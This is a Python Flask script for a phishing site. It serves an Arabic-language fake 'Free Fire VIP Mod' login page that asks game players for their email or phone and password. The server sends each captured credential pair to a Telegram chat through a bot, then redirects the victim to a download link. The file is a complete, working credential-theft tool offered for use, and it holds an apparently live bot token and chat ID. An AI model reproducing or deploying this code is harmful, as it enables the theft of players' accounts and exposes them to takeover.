import telebot
from flask import Flask, request, render_template_string, redirect
import base64
import os

# --- بياناتك الخاصة ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- رابط التحميل (ضع رابط ملفك هنا) ---
DOWNLOAD_LINK = "https://www.mediafire.com/file/example" 

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Free Fire VIP Mod - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0a0a0a; color: #7d2ae8; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #7d2ae8; background: #111; padding: 20px; border-radius: 15px; box-shadow: 0 0 20px #7d2ae8; max-width: 400px; margin: auto; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #7d2ae8; background: #000; color: #fff; }
        .btn { background: #7d2ae8; color: #fff; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; }
        .header-img { width: 100px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://img.icons8.com/color/512/free-fire.png" class="header-img">
        <h2>تسجيل دخول الحساب</h2>
        <p>قم بتسجيل الدخول لربط الهاك بحسابك وتفعيل الـ VIP</p>
        
        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        
        <button class="btn" onclick="sendData()">تسجيل الدخول والتحميل</button>
    </div>

    <script>
    function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        if(email == "" || pass == "") { alert("يرجى ملء البيانات!"); return; }

        // إرسال البيانات للسيرفر
        fetch('/login_data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({u: email, p: pass})
        }).then(() => {
            // التحويل لرابط التحميل بعد الإرسال
            window.location.href = "{{ download_url }}";
        });
    }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)

@app.route('/login_data', methods=['POST'])
def login_data():
    data = request.json
    username = data['u']
    password = data['p']
    
    # إرسال البيانات لتلغرام
    msg = f"🔥 **صيد جديد (حساب فري فاير)!**\n\n👤 الإيميل: `{username}`\n🔑 الباسورد: `{password}`"
    bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
